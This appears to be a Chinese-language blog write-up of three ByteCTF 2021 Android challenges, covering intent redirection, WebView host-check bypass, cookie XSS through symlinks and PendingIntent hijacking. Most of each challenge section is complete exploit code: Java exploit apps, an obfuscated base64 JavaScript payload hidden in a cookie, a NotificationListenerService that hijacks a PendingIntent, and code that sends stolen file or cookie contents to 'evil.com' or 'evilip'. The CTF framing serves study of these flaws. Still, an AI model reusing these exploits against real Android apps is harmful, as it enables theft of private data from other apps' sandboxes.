# Bytectf2021初赛

有几道Android pwn感觉挺有意思的

<!--more-->

## Intent重定向

Intent是Android 常用的组件间互相通信的信息对象，常用于启动组件或传递数据

![](/images/bytectf2021-pre/1.png)

Intent重定向漏洞类似web中的SSRF，可以借助可导出的应用重定向到非导出的应用

通过intent重定向，可以以目标app的权限来间接访问到应用中的未导出的组件，即**launch anywhere**。

常见的利用场景

- 系统settings可以绕过密码认证的界面打开重置手机pin码的activity
- 打开未导出的webview组件进一步转化为webview的漏洞
- 打开外部app，这个过程中可以进行一次临时的授权，给予外部app对文件的读写权限。

Intent重定向的常见形式:

![](/images/bytectf2021-pre/3.png)

## babydroid

### Apk分析

Manifest文件:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.bytectf.babydroid" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>
    <application android:theme="@style/Theme.Babydroid" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity android:name="com.bytectf.babydroid.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.bytectf.babydroid.Vulnerable">
            <intent-filter>
                <action android:name="com.bytectf.TEST"/>
            </intent-filter>
        </activity>
        <receiver android:name="com.bytectf.babydroid.FlagReceiver" android:exported="false">
            <intent-filter>
                <action android:name="com.bytectf.SET_FLAG"/>
            </intent-filter>
        </receiver>
        <provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="androidx.core.content.FileProvider" android:grantUriPermissions="true">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
        </provider>
    </application>
</manifest>
```

当Activity中存在intent-filter时默认时可导出的，所以外部应用可以直接打开`Vulnerable`，其内容如下：

```java
public class Vulnerable extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startActivity((Intent) getIntent().getParcelableExtra("intent"));
    }
}
```

利用这个方法可以使用传入的intent参数直接`startactivity`且没有任何校验，这样就可以以目标app的身份进行一次`startactivity`完成intent的重定向。

app中存在一个非导出的`FileProvider`，可以提供文件的读写和分享能力。其执行的file_paths内容如下：

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root" path=""/>
</paths>
```

其导出的文件可以从root即根路径开始，都可以用这个FileProvider访问到(前提时目标app有权限访问，可以访问目标app沙箱内部的文件，以此完成沙箱内的文件读写，甚至可以读写内部的可执行文件，dex or so)

所以可以使用**intent重定向**来访问这个非导出的FileProvider内容，使用目标app的权限来读取其沙箱内部的文件。flag文件是通过接收广播后写入到沙箱内部files文件夹中的。

一般app中除了FileProvider还有其他可利用的内容，比如说联系人等。

### 攻击过程

![](/images/bytectf2021-pre/2.png)

### Exp

MainActivity:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if(getIntent().getAction().equals("evil")){
            Uri data = getIntent().getData();
            try {
                InputStream inputStream = getContentResolver().openInputStream(data);
                byte[] bytes = new byte[inputStream.available()];
                inputStream.read(bytes);
                String str = new String(bytes);
                Log.e("evil", str);
                httprequest("http://evil.com/?" + str);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }else{
            Intent extra = new Intent("evil");
            extra.setClassName(getPackageName(), MainActivity.class.getName());
         extra.setData(Uri.parse("content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag"));
            extra.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                    | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                    | Intent.FLAG_GRANT_READ_URI_PERMISSION
                    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

            Intent intent = new Intent();
            intent.setClassName("com.bytectf.babydroid", "com.bytectf.babydroid.Vulnerable");
            intent.setAction("com.bytectf.TEST");
            intent.putExtra("intent", extra);
            startActivity(intent);
        }
    }
}
```

## easydroid
### Apk分析

题目中可导出的`MainActivity`内容:

```java
public class MainActivity extends AppCompatActivity {
    /* access modifiers changed from: protected */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        if (data == null) {
            data = Uri.parse("http://app.toutiao.com/");
        }
        if (data.getAuthority().contains("toutiao.com") && data.getScheme().equals("http")) {
            WebView webView = new WebView(getApplicationContext());
            webView.setWebViewClient(new WebViewClient() {
                /* class com.bytectf.easydroid.MainActivity.AnonymousClass1 */

                @Override // android.webkit.WebViewClient
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!Uri.parse(url).getScheme().equals("intent")) {
                        return super.shouldOverrideUrlLoading(view, url);
                    }
                    try {
                        MainActivity.this.startActivity(Intent.parseUri(url, 1));
                    } catch (URISyntaxException e) {
                        e.printStackTrace();
                    }
                    return true;
                }
            });
            setContentView(webView);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(data.toString());
        }
    }
}
```

`if`条件部分可以绕过。payload: `http://toutiao.com@evil.com/poc.htm`

在`shouldOverrideUrlLoading`中可以看到，传入的是`intent`协议时可以发生跳转。**即一次intent重定向**,使用这次intent重定向可以打开`export=false`的TestActivity界面。

`Intent.parseUri()`方法的第二个参数flag有三种类型：`Intent.URI_ANDROID_APP_SCHEME` 和 `Intent.URI_INTENT_SCHEME` 还有 `URI_ALLOW_UNSAFE`；第三种不安全，一般不使用。

前俩种的格式为`intent://host/#Intent;scheme=hansel;package=com.hansel.app;end` 和 `android-app://{package_id}[/{scheme}[/{host}[/{path}]]][#Intent;{…}]` 
`Intent.parseUri()`源码:

```java
    public static Intent parseUri(String uri, int flags) throws URISyntaxException {
        int i = 0;
        try {
            final boolean androidApp = uri.startsWith("android-app:");

 // flag传入URI_INTENT_SCHEME这个条件成立，生成的是自定义的scheme协议，非intent://和app-android://,所以上面把自定义的scheme加入URI_INTENT_SCHEME即可
            if ((flags&(URI_INTENT_SCHEME|URI_ANDROID_APP_SCHEME)) != 0) {
                if (!uri.startsWith("intent:") && !androidApp) {
                    Intent intent = new Intent(ACTION_VIEW);
                    try {
                        intent.setData(Uri.parse(uri));
                    } catch (IllegalArgumentException e) {
                        throw new URISyntaxException(uri, e.getMessage());
                    }
                    return intent;
                }
            }
            // 看下是否有#Intent后续的参数内容
            i = uri.lastIndexOf("#");
            // simple case
            if (i == -1) {
                if (!androidApp) {
                    return new Intent(ACTION_VIEW, Uri.parse(uri));
                }

            // old format Intent URI
            } else if (!uri.startsWith("#Intent;", i)) {
                if (!androidApp) {
                    return getIntentOld(uri, flags);
                } else {
                    i = -1;
                }
            }

            // new format
            Intent intent = new Intent(ACTION_VIEW);
            Intent baseIntent = intent;
            boolean explicitAction = false;// 指定action
            boolean inSelector = false;

            // fetch data part, if present
            String scheme = null;
            String data;
            if (i >= 0) {
                data = uri.substring(0, i);
                i += 8; // length of "#Intent;"
            } else {
                data = uri;
            }
            // 获取#Intent后面的附加属性
            // loop over contents of Intent, all name=value;
            while (i >= 0 && !uri.startsWith("end", i)) {
                int eq = uri.indexOf('=', i);
                if (eq < 0) eq = i-1;
                int semi = uri.indexOf(';', i);
                String value = eq < semi ? Uri.decode(uri.substring(eq + 1, semi)) : "";

                // action
                if (uri.startsWith("action=", i)) {
                    intent.setAction(value);
                    if (!inSelector) {
                        explicitAction = true;
                    }
                }

                // categories
                else if (uri.startsWith("category=", i)) {
                    intent.addCategory(value);
                }

                // type
                else if (uri.startsWith("type=", i)) {
                    intent.mType = value;
                }

                // launch flags
                else if (uri.startsWith("launchFlags=", i)) {
                    intent.mFlags = Integer.decode(value).intValue();
                    if ((flags& URI_ALLOW_UNSAFE) == 0) {
                        intent.mFlags &= ~IMMUTABLE_FLAGS;
                    }
                }

                // package
                else if (uri.startsWith("package=", i)) {
                    intent.mPackage = value;
                }

                // component
                else if (uri.startsWith("component=", i)) {
                    intent.mComponent = ComponentName.unflattenFromString(value);
                }

                // scheme
                else if (uri.startsWith("scheme=", i)) {
                    if (inSelector) {
                        intent.mData = Uri.parse(value + ":");
                    } else {
                        scheme = value;
                    }
                }

                // source bounds
                else if (uri.startsWith("sourceBounds=", i)) {
                    intent.mSourceBounds = Rect.unflattenFromString(value);
                }

                // selector
                else if (semi == (i+3) && uri.startsWith("SEL", i)) {
                    intent = new Intent();
                    inSelector = true;
                }

                // extra
                else {
                    String key = Uri.decode(uri.substring(i + 2, eq));
                    // create Bundle if it doesn't already exist
                    if (intent.mExtras == null) intent.mExtras = new Bundle();
                    Bundle b = intent.mExtras;
                    // add EXTRA
                    if      (uri.startsWith("S.", i)) b.putString(key, value);
                    else if (uri.startsWith("B.", i)) b.putBoolean(key, Boolean.parseBoolean(value));
                    else if (uri.startsWith("b.", i)) b.putByte(key, Byte.parseByte(value));
                    else if (uri.startsWith("c.", i)) b.putChar(key, value.charAt(0));
                    else if (uri.startsWith("d.", i)) b.putDouble(key, Double.parseDouble(value));
                    else if (uri.startsWith("f.", i)) b.putFloat(key, Float.parseFloat(value));
                    else if (uri.startsWith("i.", i)) b.putInt(key, Integer.parseInt(value));
                    else if (uri.startsWith("l.", i)) b.putLong(key, Long.parseLong(value));
                    else if (uri.startsWith("s.", i)) b.putShort(key, Short.parseShort(value));
                    else throw new URISyntaxException(uri, "unknown EXTRA type", i);
                }

                // move to the next item
                i = semi + 1;
            }

            if (inSelector) {
                // The Intent had a selector; fix it up.
                if (baseIntent.mPackage == null) {
                    baseIntent.setSelector(intent);
                }
                intent = baseIntent;
            }

            if (data != null) {
                if (data.startsWith("intent:")) {
                    data = data.substring(7);
                    if (scheme != null) {
                        data = scheme + ':' + data;
                    }
                } else if (data.startsWith("android-app:")) {
                    if (data.charAt(12) == '/' && data.charAt(13) == '/') {
                        // Correctly formed android-app, first part is package name.
                        int end = data.indexOf('/', 14);
                        if (end < 0) {
                            // All we have is a package name.
                            intent.mPackage = data.substring(14);
                            if (!explicitAction) {//没有action属性的时候“app-android”使用默认action_main
                                intent.setAction(ACTION_MAIN);
                            }
                            data = "";
                        } else {
                            // Target the Intent at the given package name always.
                            String authority = null;
                            intent.mPackage = data.substring(14, end);
                            int newEnd;
                            if ((end+1) < data.length()) {
                                if ((newEnd=data.indexOf('/', end+1)) >= 0) {
                                    // Found a scheme, remember it.
                                    scheme = data.substring(end+1, newEnd);
                                    end = newEnd;
                                    if (end < data.length() && (newEnd=data.indexOf('/', end+1)) >= 0) {
                                        // Found a authority, remember it.
                                        authority = data.substring(end+1, newEnd);
                                        end = newEnd;
                                    }
                                } else {
                                    // All we have is a scheme.
                                    scheme = data.substring(end+1);
                                }
                            }
                            if (scheme == null) {
                                // If there was no scheme, then this just targets the package.
                                if (!explicitAction) {
                                    intent.setAction(ACTION_MAIN);
                                }
                                data = "";
                            } else if (authority == null) {
                                data = scheme + ":";
                            } else {
                                data = scheme + "://" + authority + data.substring(end);
                            }
                        }
                    } else {
                        data = "";
                    }
                }

                if (data.length() > 0) {
                    try {
                        intent.mData = Uri.parse(data);
                    } catch (IllegalArgumentException e) {
                        throw new URISyntaxException(uri, e.getMessage());
                    }
                }
            }

            return intent;

        } catch (IndexOutOfBoundsException e) {
            throw new URISyntaxException(uri, "illegal Intent URI format", i);
        }
    }
```

因为后续需要使用`file`协议加载本地文件，`MainActivty`中固定了协议只能是`http`，但是`TestActivity`文件也使用了webview且没有对url进行任何过滤操作，可以使用file协议。所以可以使用intent重定向，转到TestActivity。

```java
public class TestActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String url = getIntent().getStringExtra("url");
        WebView webView = new WebView(getApplicationContext());
        setContentView(webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl(url);
    }
}
```

然后携带url参数加载本地file文件。`intent`协议中携带参数的方式在源码中可以看到，携带String类型的参数时格式时`S.key=value;`

Apk通过广播的方式设置flag，flag写入本地Cookies文件:

```java
public class FlagReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        if (flag != null) {
            try {
                String flag2 = Base64.encodeToString(flag.getBytes("UTF-8"), 0);
                CookieManager cookieManager = CookieManager.getInstance();
                cookieManager.setCookie("https://tiktok.com/", "flag=" + flag2);
                Log.e("FlagReceiver", "received flag.");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
    }
}
```

### 攻击过程

> 1. 打开MainActivity，使用`http://toutiao.com@evil/loadCookie.html`绕过校验，写入cookie并停留40秒
> 2. 创建symlink.html符号连接，指向目标沙箱内Cookies数据库文件
> 3. 打开MainActivity，使用`http://toutiao.com@evil/loadFile.html`绕过校验，触发`shouldOverrideUrlLoading`方法加载TestActivity，url参数设置为`file:///data/user/0/com.bytectf.pwneasydroid/symlink.html`

步骤1中写入的cookie中包含恶意代码，代码作用是读取页面内容并发送到远程服务器。当步骤3中用file协议加载symlink.html文件时实际上时加载`/data/0/user/com.bytectf.easydroid./app_webview/Cookies`文件，渲染的过程中会执行注入到cookie中的恶意代码，导致cookie内容被发送到远程服务器。

### Exp

MainActivity:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        launch("http://toutiao.com@evilip/loadcookie.html");
        symlink();
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                launch("http://toutiao.com@evilip/loadfile.html");
            }
        }, 40000);
    }

    private void launch(String url){
        Intent intent = new Intent();
        intent.setClassName("com.bytectf.easydroid", "com.bytectf.easydroid.MainActivity");
        Uri uri = Uri.parse(url);
        intent.setData(uri);
        intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                | Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        startActivity(intent);
    }

    private String symlink() {
        String root = getApplicationInfo().dataDir;
        String symlink = root + "/symlink.html";
        Log.e("url", symlink);
        try{
            String cookies = getPackageManager().getApplicationInfo("com.bytectf.easydroid",
                    0).dataDir + "/app_webview/Cookies";
            Runtime.getRuntime().exec("rm " + symlink).waitFor();
            Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
            Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();


        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return symlink;
    }
}
```

loadcookie.html:

```html
<!DOCTYPE html>
<html>
    <h1> injected cookie with xss</h1>
    <script>
        document. cookie = "x = '<img src=\"x\" onerror=\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9ldmlsaXAvP2Nvb2tpZT0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs='))\">'"
    </script>
</html>
<!--new Image().src = "http://evilip/?cookie=" + encodeURIComponent(document.getElementsByTagName("html")[0].innerHTML);-->
```

loadfile.html:

```html
<!DOCTYPE html>
<html>
    <h1>load file</h1>
    <script>
        document.location = "intent:#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/user/0/com.bytectf.pwneasydroid/symlink.html;end";
    </script>
</html>
```

在自己写intent隐式跳转的时候，intent的具体格式搜了挺久才找到正确的写法，然后其实有直接转String的方法:

```java
Intent i2 = new Intent();
i2.setClassName("com.bytectf.easydroid", "com.bytectf.easydroid.TestActivity");
i2.putExtra("url", url);
String uri_data = i2.toUri(Intent.URI_INTENT_SCHEME);  // 在这里直接转String
intent.setData(Uri.parse("http://ip/jump.html?url=" + Uri.encode(uri_data)));
```

## mediumdroid

### Apk分析

与easydroid类似，但是flag没有存储在Cookie中，而是跟babydroid一样存储在flag文件中。

在TestActivity中提供了一个jsi

```java
public class TestActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String url = getIntent().getStringExtra("url");
        WebView webView = new WebView(getApplicationContext());
        setContentView(webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(this, "jsi");
        webView.loadUrl(url);
    }

    @JavascriptInterface
    public void Te3t(String title, String content) {
        if (Build.VERSION.SDK_INT >= 26) {
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(new NotificationChannel("CHANNEL_ID", "CHANNEL_NAME", 4));
        }
        NotificationManagerCompat.from(this).notify(100, new NotificationCompat.Builder(this, "CHANNEL_ID").setContentTitle(title).setContentText(content).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(PendingIntent.getBroadcast(this, 0, new Intent(), 0)).setAutoCancel(true).setPriority(1).build());
    }
}
```

其中`PendingIntent.getBroadcast(this, 0, new Intent()`存在`BroadcastAnywhere`漏洞。借助这个漏洞可以写一个`NotificationListenerService`(监听通知栏的消息)进行监听，然后由于直接使用`new Intent()`，action，category，data，clipdata，package均为空可以被修改。将`action`和`package`修改成`FlagReceiver`接受的广播就可以在`flag`文件中写入xss payload，后面再用`file`协议加载`flag`文件即可。

### 攻击过程

> 1. 调用MainActivity，跳转到TestActivity，url指向的网页内容写调用jsi.Te3t的代码。
> 2. 用来监听的`NotificationListenerService`会监听到对应的广播PendingIntent，将action设置成`SET_FLAG`，内容设置成xss payload然后转发出去。
> 3. 调用MainActivity，跳转到TestActivity，url指向的`symlink.html`(flag文件的链接)

### Exp

MainActivity:

```java
public class MainActivity extends AppCompatActivity {

    public String target = "com.bytectf.mediumdroid";
    public String evil = "http://evilip/";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startService(new Intent(this, MagicService.class));

        launch(evil + "callTe3t.html");

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                launch("file://" + symlink());
            }
        }, 5000);
    }

    private void launch(String url){
        Intent main_intent = new Intent();
        main_intent.setClassName(target, target + ".MainActivity");
        main_intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                | Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

        Intent test_intent = new Intent();
        test_intent.setClassName(target, target + ".TestActivity");
        test_intent.putExtra("url", url);
        String test_intent_uri = test_intent.toUri(Intent.URI_INTENT_SCHEME);

        main_intent.setData(Uri.parse("http://toutiao.com@evilip/jump.html?url=" + Uri.encode(test_intent_uri)));
        startActivity(main_intent);
    }

    private String symlink() {
        String root = getApplicationInfo().dataDir;
        String symlink = root + "/symlink.html";
        Log.e("url", symlink);
        try{
            String cookies = getPackageManager().getApplicationInfo(target,
                    0).dataDir + "/files/flag";
            Runtime.getRuntime().exec("rm " + symlink).waitFor();
            Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
            Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();


        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return symlink;
    }
}
```

MagicService:

```java
public class MagicService extends NotificationListenerService {

    public String target = "com.bytectf.mediumdroid";
    public String payload = "xss payload";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.e(target, "onCreate");
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.e(target, "onListen");
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if(!sbn.getPackageName().equals(target))
            return;

        Notification notification = sbn.getNotification();
        if(notification.extras != null){
            PendingIntent pendingIntent = notification.contentIntent;
            Intent evil_intent = new Intent();
            evil_intent.setAction("com.bytectf.SET_FLAG");
            evil_intent.setPackage(target);
            evil_intent.putExtra("flag", payload);
            try {
                pendingIntent.send(this, 0, evil_intent);
            } catch (PendingIntent.CanceledException e) {
                e.printStackTrace();
            }
        }
        super.onNotificationPosted(sbn);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.e(target, "onNotificationRemoved");
    }
}
```

jump.html:(可以根据url参数的内容做跳转)

```html
<!DOCTYPE html>
<html>
    <h1>Jump to TestActivity</h1>
    <script>
        function GetQueryString(name)
        {
            var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
            var r = window.location.search.substr(1).match(reg);
            if(r!=null)
                return  unescape(r[2]); 
            return null;
        }
        function doitjs()
        {
            location.href = decodeURIComponent(GetQueryString('url'));
        }
        setTimeout(doitjs, 0);
    </script>
</html>
```

callTe3t.html

```html
<!DOCTYPE html>
<html>
    <body>
        <h1>jsi test</h1>
        <script>jsi.Te3t('test1', 'test2');</script>
    </body>
</html>
```

Manifest.xml:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bytectf.pwnmediumdroid">

    <uses-permission android:name="android.permission.INTERNET"/>

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <service
            android:name=".MagicService"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>

        </service>

        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```

运行的时候还要给一遍通知权限：

```shell
adb shell cmd notification allow_listener com.bytectf.pwnmediumdroid/com.bytectf.pwnmediumdroid.MagicService
```

or:

```shell
adb shell settings put secure enabled_notification_listeners %nlisteners:com.bytectf.pwnmediumdroid/com.bytectf.pwnmediumdroid.MagicService
```

结果:

![](/images/bytectf2021-pre/4.png)

## 参考链接
[Android: Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)  

[安卓漏洞从0到1--PPT](https://bytedance.feishu.cn/file/boxcnWibqpknk3S708qerqHoxiP) 

[安卓漏洞从0到1--视频](https://bytedance.feishu.cn/file/boxcneAJtsVQSoNusVPeJPNskkc)  

[2020 看雪SDC议题回顾 | Android WebView安全攻防指南2020](https://zhuanlan.kanxue.com/article-14155.htm)  

[android(8)-WebView安全](http://www.feidao.site/wordpress/?p=3390)  

[ByteCTF 2021 By W&M（PWN）部分](https://mp.weixin.qq.com/s/fqX-ICojKhe-FBGCLhWB0A)


